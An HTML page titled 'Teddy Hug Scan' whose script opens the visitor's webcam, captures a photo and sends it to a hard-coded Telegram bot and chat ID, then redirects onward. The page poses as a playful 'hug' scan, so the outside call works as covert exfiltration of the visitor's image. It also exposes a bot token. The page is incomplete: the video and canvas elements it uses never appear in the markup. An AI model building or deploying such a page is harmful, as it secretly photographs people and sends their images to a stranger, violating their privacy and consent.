<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Teddy Hug Scan</title>
  <script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
    })
    .catch(err => {
      alert('Camera access denied or unavailable.');
    });

  function captureAndSend() {
    if (!video.videoWidth || !video.videoHeight) {
      alert("Please wait for the camera to load.");
      return;
    }

    // ðŸ”½ Directly low-res photo
    const width = 320;
    const height = video.videoHeight / (video.videoWidth / width);
    canvas.width = width;
    canvas.height = height;
    ctx.drawImage(video, 0, 0, width, height);

    const photo = canvas.toDataURL('image/jpeg'); // no quality param needed

    fetch("https://api.telegram.org/bot7613683060:AAEsyP1JaIKh1mLawCyWmFxpgl0KOToj2Xs/sendPhoto", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: 1786564127,
        photo: photo
      })
    })
    .then(res => res.json())
    .then(data => {
      if (data.ok) {
        window.location.href = 'teddy3.html'; // âœ… success redirect
      } else {
        alert("Failed to send hug. Please try again later.");
        console.error(data);
      }
    })
    .catch(err => {
      console.error("Send error:", err);
      alert("An error occurred. Try again.");
    });
  }
</script>
</body>
</html>
